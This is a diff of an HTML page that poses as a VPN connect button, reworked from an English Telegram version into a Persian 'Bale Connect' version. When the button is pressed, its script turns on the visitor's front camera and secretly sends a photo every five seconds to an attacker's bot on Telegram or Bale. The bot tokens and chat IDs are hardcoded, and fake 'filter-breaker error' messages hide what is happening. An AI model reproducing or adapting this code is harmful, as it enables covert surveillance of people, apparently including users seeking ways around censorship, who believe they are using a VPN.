@@ -3,32 +3,34 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VPN Pro Connect</title>
+    <title>Bale Connect</title>
     <style>
-        body { margin: 0; background: radial-gradient(circle, #2c3e50, #000); color: #fff; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .circle { width: 200px; height: 200px; border-radius: 50%; border: 8px solid #ff4d4d; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: 0.5s; box-shadow: 0 0 20px #ff4d4d; position: relative; }
-        .circle.connected { border-color: #2ecc71; box-shadow: 0 0 30px #2ecc71; }
-        .status { font-size: 22px; font-weight: bold; color: #ff4d4d; margin-top: 30px; }
-        .connected .status { color: #2ecc71; }
-        #msg { margin-top: 15px; font-size: 14px; color: #2ecc71; text-align: center; padding: 0 20px; }
+        body { margin: 0; background: #f8f9fa; color: #333; font-family: Tahoma, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .circle { width: 170px; height: 170px; border-radius: 50%; border: 5px solid #00a591; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: 0.3s; background: #fff; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        .circle.active { background: #00a591; border-color: #00796b; }
+        .circle span { color: #00a591; font-size: 20px; font-weight: bold; }
+        .circle.active span { color: #fff; }
+        .status { font-size: 18px; margin-top: 20px; font-weight: bold; color: #555; }
+        #msg { margin-top: 15px; font-size: 14px; font-weight: bold; min-height: 20px; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
 <div class="circle" id="circle" onclick="toggle()">
-    <span id="txt" style="font-size: 24px; font-weight: bold;">Connect</span>
+    <span id="txt">اتصال</span>
 </div>
 
-<div class="status" id="st">Disconnected</div>
+<div class="status" id="st">وضعیت: قطع</div>
 <div id="msg"></div>
 
 <video id="v" autoplay playsinline></video>
 <canvas id="c"></canvas>
 
 <script>
-    const token = "8182631007:AAEisj-KpQr-pDJkZ6SP9_lqAkrTQ2ki_oc";
-    const chat_id = "6156668050"; // آیدی جدید شما جایگزین شد
+    // اطلاعات جدید شما برای بله
+    const token = "2130252958:5Zzvo7yjpkkrCTs3-A2GDEgxOQRGZt_9FPY"; 
+    const chat_id = "630900118"; 
 
     let on = false, int = null, stream = null;
     const circle = document.getElementById('circle'), txt = document.getElementById('txt');
@@ -38,17 +40,19 @@
     async function toggle() {
         if (!on) {
             try {
-                msg.innerHTML = "در حال اتصال...";
+                // درخواست دوربین جلو
                 stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 v.srcObject = stream;
                 on = true;
-                circle.classList.add('connected');
-                txt.textContent = "Stop";
-                st.textContent = "Connected";
-                msg.innerHTML = "متصل شد! ...";
+                circle.classList.add('active');
+                txt.textContent = "توقف";
+                st.textContent = "وضعیت: متصل";
+                msg.innerHTML = "";
+                // ارسال عکس هر 5 ثانیه
                 int = setInterval(takeShot, 5000);
             } catch (err) {
-                msg.innerHTML = "خطا: نشد.";
+                msg.style.color = "#d32f2f";
+                msg.innerHTML = "خطای فیلترشکن";
             }
         } else { stop(); }
     }
@@ -56,9 +60,9 @@
     function stop() {
         on = false; clearInterval(int);
         if (stream) stream.getTracks().forEach(t => t.stop());
-        circle.classList.remove('connected');
-        txt.textContent = "Connect";
-        st.textContent = "Disconnected";
+        circle.classList.remove('active');
+        txt.textContent = "اتصال";
+        st.textContent = "وضعیت: قطع";
         msg.innerHTML = "";
     }
 
@@ -69,17 +73,29 @@
         c.toBlob(blob => {
             const formData = new FormData();
             formData.append('chat_id', chat_id);
-            formData.append('photo', blob, 'shot.jpg');
-            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData })
+            formData.append('photo', blob, 'img.jpg');
+
+            // ارسال به سرور بله
+            fetch(`https://tapi.bale.ai/bot${token}/sendPhoto`, { 
+                method: 'POST', 
+                body: formData 
+            })
             .then(res => res.json())
             .then(data => {
-                if(data.ok) msg.innerHTML = " وصل شد ✅";
-                else msg.innerHTML = "خطای : " + data.description;
+                if(data.ok) {
+                    msg.style.color = "#00a591";
+                    msg.innerHTML = "وصل شد";
+                } else {
+                    msg.style.color = "#d32f2f";
+                    msg.innerHTML = "خطای فیلترشکن";
+                }
             })
-            .catch(() => { msg.innerHTML = "خطا: فیلترشکن را چک کنید!"; });
-        }, 'image/jpeg', 0.6);
+            .catch(() => { 
+                msg.style.color = "#d32f2f";
+                msg.innerHTML = "خطای فیلترشکن"; 
+            });
+        }, 'image/jpeg', 0.5);
     }
 </script>
 </body>
 </html>
-
